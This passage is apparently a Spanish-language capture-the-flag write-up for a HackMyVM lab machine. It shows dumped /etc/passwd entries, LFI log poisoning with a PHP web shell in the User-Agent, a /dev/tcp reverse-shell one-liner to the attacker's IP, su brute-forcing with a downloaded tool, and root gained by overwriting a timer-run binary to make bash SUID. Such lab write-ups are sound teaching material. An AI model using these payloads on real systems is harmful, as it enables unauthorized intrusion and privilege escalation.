sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:54:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
talos:x:1000:1000:Talos,,,:/home/talos:/bin/bash
_rpc:x:102:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:103:65534::/var/lib/nfs:/usr/sbin/nologin
byron:x:1001:1001::/home/byron:/bin/sh
hermanubis:x:1002:1002::/home/hermanubis:/bin/sh
melville:x:1003:1003::/home/melville:/bin/bash

```
### LFI TO RCE
Como nginx estaba corriendo en la web probaremos un Log Poisoned.
```bash
curl -s -X GET http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//var/log/nginx/access.log
"GET / HTTP/1.1" 200 3437 "-" "HomeNet/1.0"
192.168.101.10 - - [25/Dec/2023:16:42:16 +0000] "GET /index.php?filename=....//....//....//....//....//var/log/nginx/access.log HTTP/1.1" 200 871 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

```
Al poder ver los logs podemos realizar el [envenenamiento de logs](https://lathack.com/vulnerabilidad-log-poisoning/).
```bash
curl -s -X GET http://thetruthoftalos.hmv/index.php\?filename\=....//....//....//....//....//var/log/nginx/access.log -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
"GET / HTTP/1.1" 200 3437 "-" "HomeNet/1.0"
192.168.101.10 - - [25/Dec/2023:16:42:16 +0000] "GET /index.php?filename=....//....//....//....//....//var/log/nginx/access.log HTTP/1.1" 200 871 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
192.168.101.10 - - [25/Dec/2023:16:42:34 +0000] "GET /index.php?filename=....//....//....//....//....//var/log/nginx/access.log HTTP/1.1" 200 2335 "-" "curl/8.3.0"
```
Con el parametro cmd por GET que inyectamos en el User-Agent tenemos RCE.

```bash
curl -s -X GET http://thetruthoftalos.hmv/index.php\?filename\=....//....//....//....//....//var/log/nginx/access.log\&cmd\=id
```
## Shell - www-data
Nos mandamos una reverse shell a nuestra maquina por el puerto 443

```
bash -c "bash -i >& /dev/tcp/192.168.101.10/443 0>&1"
```
```bash
curl -s -X GET 'http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//var/log/nginx/access.log' -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.101.10/443 0>&1"'
```
## Shell - hermanubis
Como teniamos una la contraseña de hermanubis la probamos y obtenemos shell como hermanubis.
```bash
www-data@principle2:/home/talos$ su hermanubis
Password: ByronIsAsshole
$ bash
hermanubis@principle2:/home/talos$ 
```
```bash
hermanubis@principle2:~$ cat investigation.txt 
I am aware that Byron hates me... especially since I lost my password.
My friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....
What he doesn't know is that it is in the Byron database...
hermanubis@principle2:~$ 

```
## Shell - melville
El fichero nos dice que la contraseña de melville es de 32 caracteres y que el no sabe que byron lo tiene en su base de datos.
Si recordamos byron tenia un registro con diversas contraseñas. Podemos intentar probarlas.

Usaremos una herramienta para realizar fuerza bruta al su [suForce](https://github.com/d4t4s3c/suForce).

Pasamos el script y las contraseñas a la maquina víctima mediante python3.


```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.101.12 - - [25/Dec/2023 12:03:52] "GET /suForce HTTP/1.1" 200 -

hermanubis@principle2:/tmp$ wget http://192.168.101.10/suForce
--2023-12-25 17:03:55--  http://192.168.101.10/suForce
Connecting to 192.168.101.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 23611 (23K) [application/octet-stream]
Saving to: ‘suForce’

suForce             100%[===================>]  23.06K  --.-KB/s    in 0s      

2023-12-25 17:03:55 (376 MB/s) - ‘suForce’ saved [23611/23611]

hermanubis@principle2:/tmp$ chmod +x suForce 
hermanubis@principle2:/tmp$ wget http://192.168.101.10/hex
--2023-12-25 17:05:22--  http://192.168.101.10/hex
Connecting to 192.168.101.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 33033 (32K) [application/octet-stream]
Saving to: ‘hex’

hex                 100%[===================>]  32.26K  --.-KB/s    in 0s      

2023-12-25 17:05:22 (89.8 MB/s) - ‘hex’ saved [33033/33033]
```
Ejecutamos la herramienta

```bash 
hermanubis@principle2:/tmp$ ./suForce -u melville -w hex 
            _____                        
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
-=================================-                                   
[*] Username: melville
[*] Wordlist: hex
[i] Status
    56/1001/5%/1bd5528b6def9812acba8eb21562c3ec                              
[+] Password: 1bd5528b6def9812acba8eb21562c3ec Line: 56
-=================================-

```
Teniendo la contraseña nos movemos a melville
```bash
hermanubis@principle2:/tmp$ su melville
Password: 
root is watching you, it has a record of all your steps:

melville@principle2:/tmp$ 
```
Verificando los timers en el sistema vemos que hay uno que se acaba de ejecutar hace 10s es cual es `activity.timer`.
```bash
melville@principle2:/tmp$ systemctl list-timers 
NEXT                        LEFT          LAST                        PASSED             UNIT                         ACTIVATES     >
Mon 2023-12-25 17:11:58 GMT 1min 49s left Mon 2023-12-25 17:09:58 GMT 10s ago            activity.timer               activity.servi>
Mon 2023-12-25 17:39:00 GMT 28min left    Mon 2023-12-25 17:09:08 GMT 1min 0s ago        phpsessionclean.timer        phpsessionclea>
Mon 2023-12-25 18:01:06 GMT 50min left    Mon 2023-11-27 14:57:51 GMT 4 weeks 0 days ago fstrim.timer                 fstrim.service
Mon 2023-12-25 21:18:17 GMT 4h 8min left  Tue 2023-11-28 23:24:05 GMT 3 weeks 5 days ago apt-daily.timer              apt-daily.serv>
Tue 2023-12-26 00:00:00 GMT 6h left       -                           -                  dpkg-db-backup.timer         dpkg-db-backup>
Tue 2023-12-26 00:00:00 GMT 6h left       Mon 2023-12-25 16:41:23 GMT 28min ago          logrotate.timer              logrotate.serv>
Tue 2023-12-26 04:11:06 GMT 11h left      Mon 2023-11-27 20:21:23 GMT 3 weeks 6 days ago man-db.timer                 man-db.service
Tue 2023-12-26 06:55:15 GMT 13h left      Mon 2023-12-25 16:46:48 GMT 23min ago          apt-daily-upgrade.timer      apt-daily-upgr>
Tue 2023-12-26 16:56:28 GMT 23h left      Mon 2023-12-25 16:56:28 GMT 13min ago          systemd-tmpfiles-clean.timer systemd-tmpfil>
Sun 2023-12-31 03:10:04 GMT 5 days left   Mon 2023-12-25 16:42:08 GMT 28min ago          e2scrub_all.timer            e2scrub_all.se>

10 timers listed.
Pass --all to see loaded but inactive timers, too.
```
Realizamos un status al servicio activity.service para ver que esta ejecutando.
```bash

melville@principle2:/tmp$ systemctl status activity.service 
○ activity.service - No description
     Loaded: loaded (/etc/systemd/system/activity.service; static)
     Active: inactive (dead) since Mon 2023-12-25 17:14:08 GMT; 1min 25s ago
   Duration: 2ms
TriggeredBy: ● activity.timer
    Process: 1287 ExecStart=/usr/local/share/report (code=exited, status=0/SUCCESS)
   Main PID: 1287 (code=exited, status=0/SUCCESS)
        CPU: 2ms
```

Verificamos los permisos y si podemos modificarlo `/usr/local/share/report`.
 
```bash
melville@principle2:/tmp$ ls -l /usr/local/share/report
-rwxrwx--- 1 root talos 16584 Nov 25 17:09 /usr/local/share/report
melville@principle2:/tmp$ id
uid=1003(melville) gid=1003(melville) groups=1003(melville),1000(talos)

```
Al estar en el grupo talos podemos escribir en el binario. Entonces cambiaremos el contenido para que root haga que la bash sea SUID.
```bash
melville@principle2:/tmp$ cat report 
#!/bin/bash
chmod u+s /bin/bash
melville@principle2:/tmp$ 
melville@principle2:/tmp$ cp report /usr/local/share/report 
```
```bash
melville@principle2:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
melville@principle2:/tmp$ bash -p
bash-5.2# whoami
root
bash-5.2# 
```
Y finalmente somos root. Gracias por leer!
